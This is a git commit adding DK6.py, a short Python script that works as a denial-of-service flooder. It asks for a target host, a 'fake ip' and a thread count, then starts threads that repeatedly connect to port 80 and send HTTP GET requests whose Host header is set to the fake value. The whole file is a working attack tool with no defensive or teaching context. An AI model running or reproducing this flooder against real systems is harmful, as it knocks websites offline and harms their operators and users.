25ecdaf621a380acb96a3f83db1ed1cd6318a901
Ties69 <96480921+Ties69@users.noreply.github.com>
2022-04-29 17:46:57 +0200

    Add files via upload

---
+++ DK6.py
@@ -0,0 +1,37 @@
+import threading
+import socket
+import time
+from art import *
+
+
+
+tprint("DK6", font="roman")
+
+awnser_target = input("Target: ")
+awnser_fakeip = input("Fake ip: ")
+awnser_threads =input("Amount of threads: ")
+
+already_sent = 0
+
+target = awnser_target
+port = 80
+fake_ip = awnser_fakeip
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+        global already_sent
+        already_sent += 1
+
+
+
+for i in range(int(awnser_threads)):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+    print(already_sent)
